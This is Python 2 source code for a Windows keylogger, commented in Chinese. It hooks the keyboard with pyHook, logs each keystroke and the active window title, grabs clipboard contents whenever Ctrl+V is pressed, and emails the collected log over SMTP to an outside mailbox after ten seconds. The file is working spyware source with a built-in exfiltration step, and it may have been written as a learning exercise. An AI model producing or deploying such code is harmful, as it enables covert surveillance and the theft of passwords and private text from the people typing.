# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import time
import threading
import smtplib
from email.mime.text import MIMEText
from email.header import Header

sender = '********@yeah.net'
receivers = ['********@163.com']

mail_host="smtp.yeah.net"  #设置服务器
mail_user = raw_input(u'输入用户名:')
mail_pass = raw_input(u'输入密码:')

current_window = None
recode = ""

def send_email():
    global recode
    message = MIMEText(recode, 'html', 'utf-8')
    message['From'] = Header("this", 'utf-8')
    message['To'] = Header("that", 'utf-8')

    subject = 'Python 结果文件'
    message['Subject'] = Header(subject, 'utf-8')

    try:
        smtpObj = smtplib.SMTP()
        smtpObj.set_debuglevel(1)
        smtpObj.connect(mail_host, 25)  # 25 为 SMTP 端口号
        smtpObj.login(mail_user, mail_pass)
        smtpObj.sendmail(sender, receivers, message.as_string())
        print "邮件发送成功"
    except smtplib.SMTPException:
        print "Error: 无法发送邮件"

def KeyStroke(event):
    global current_window
    global recode
    print time.time() - start_time
    if (time.time() - start_time) >= 10:
        send_email()
        exit()
    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        print
        print u"<%s>" % (current_window)
        print
        recode += u"<br><%s><br>" % (current_window)

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
        recode += u"%s " % (chr(event.Ascii))
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE]-%s" % (pasted_value),
            recode += "[PASTE]-%s " % (pasted_value)
        else:
            print "[%s]" % event.Key,
            recode += "[%s] " % (event.Key)
    # 循环监听下一个击键事件
    return True
start_time = time.time()

# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()


